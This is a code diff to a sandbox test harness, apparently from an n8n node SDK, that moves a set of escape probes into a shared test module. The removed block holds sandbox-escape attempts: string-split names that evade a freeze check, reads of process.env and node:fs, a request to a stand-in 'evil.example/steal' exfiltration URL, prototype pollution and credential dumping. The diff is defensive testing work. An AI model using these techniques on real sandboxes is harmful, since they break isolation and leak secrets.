@@ -14,6 +14,7 @@ import {
 	sandboxCredentialTypeOf,
 	versionsOf,
 } from '../../nodes-integrations/dist/index.js';
+import { escapeProbes } from '../src/__tests__/escape-probes';
 import { defineCredential, field } from '../src/credentials';
 import { freezeAction } from '../src/freeze';
 import { replayFixtures } from '../src/publish';
@@ -27,69 +28,6 @@ const LIMITS = { cpuMs: 1_000, memoryMb: 64, wallMs: 3_000 };
 const GUARD_MS = 10_000;
 const TIMEOUT = 'timeout';
 const SECRET = 'key-secret-1';
-
-// Copied from the PROBES of src/__tests__/sandbox.test.ts. Merge both when they move to one module.
-// Different here: `importProbe` gives the export names, because `String()` of a module namespace
-// throws. `builtinNetProbe` is new: real Node gives `process` to the bundle.
-const PROBES = (canary: string) => `import { defineNode, t } from '@n8n/node-sdk';
-import { credential, defineCredential, field } from '@n8n/node-sdk/credentials';
-const { obj, str } = t;
-const probe = defineNode({ id: 'probe', displayName: 'Probe' });
-const acmeToken = defineCredential({
-	id: 'acme.token',
-	legacyName: 'acmeApi',
-	displayName: 'Acme API',
-	fields: { account: field.text('Account ID'), apiKey: field.secret('API Key') },
-	baseUrl: 'https://api.acme.test',
-	auth: (a) => a.bearer('apiKey'),
-});
-const acme = defineNode({ id: 'acme', displayName: 'Acme', credential: credential({ types: [acmeToken] }) });
-const spec = (run: (context: any) => Promise<unknown>, extra: Record<string, unknown> = {}, node: any = probe) =>
-	node.action('probe', {
-		action: 'Probe',
-		summary: 'Probe the sandbox.',
-		flow: { effect: 'read', cardinality: 'per-item' },
-		input: {},
-		output: obj({ value: str() }),
-		...extra,
-		run,
-	} as any);
-const canary = '${canary}';
-// Names built at run time pass the freeze check, so the runtime must stop them.
-export const fetchProbe = spec(async () => ({ value: String(await (globalThis as any)[['fet', 'ch'].join('')](canary)) }));
-export const processProbe = spec(async () => ({ value: String((globalThis as any)[['pro', 'cess'].join('')].env.SANDBOX_CANARY) }));
-export const importProbe = spec(async () => ({ value: Object.keys(await import(['node', 'fs'].join(':'))).join(',') }));
-export const builtinNetProbe = spec(async () => {
-	const http = (globalThis as any)[['pro', 'cess'].join('')].getBuiltinModule(['node', 'http'].join(':'));
-	const value = await new Promise<string>((resolve, reject) =>
-		http.get(canary, (response: any) => response.resume().on('end', () => resolve('reached'))).on('error', reject),
-	);
-	return { value };
-});
-export const timerProbe = spec(async ({ http }) => {
-	(globalThis as any)[['set', 'Timeout'].join('')](() => void http.request({ url: canary }), 0);
-	return { value: 'scheduled' };
-});
-export const loopProbe = spec(async () => {
-	for (;;) {}
-});
-export const memoryProbe = spec(async () => {
-	const kept: unknown[] = [];
-	for (;;) kept.push(new Array(1_000_000).fill(kept.length));
-});
-export const undeclaredProbe = spec(async (context) => ({
-	value: String(await context.dataTables.open({ name: 'secrets' })),
-}));
-export const egressProbe = spec(
-	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
-	{ egress: { hosts: ['api.example.com'] } },
-);
-export const pollutionProbe = spec(async () => {
-	(Object.prototype as any).polluted = 'yes';
-	return { value: String(({} as any).polluted) };
-});
-export const credentialProbe = spec(async ({ credential }) => ({ value: JSON.stringify(credential) }), {}, acme);
-`;
 
 const acmeToken = defineCredential({
 	id: 'acme.token',
@@ -346,7 +284,7 @@ async function main() {
 	const address = server.address();
 	const port = typeof address === 'object' && address ? address.port : 0;
 	const probesFile = path.join(workDir, 'probes.ts');
-	writeFileSync(probesFile, PROBES(`http://127.0.0.1:${port}/`));
+	writeFileSync(probesFile, escapeProbes(`http://127.0.0.1:${port}/`));
 	process.env.SANDBOX_CANARY = 'secret';
 	const probeRuns = await Promise.all(
 		CHECKS.map(async (check) => {
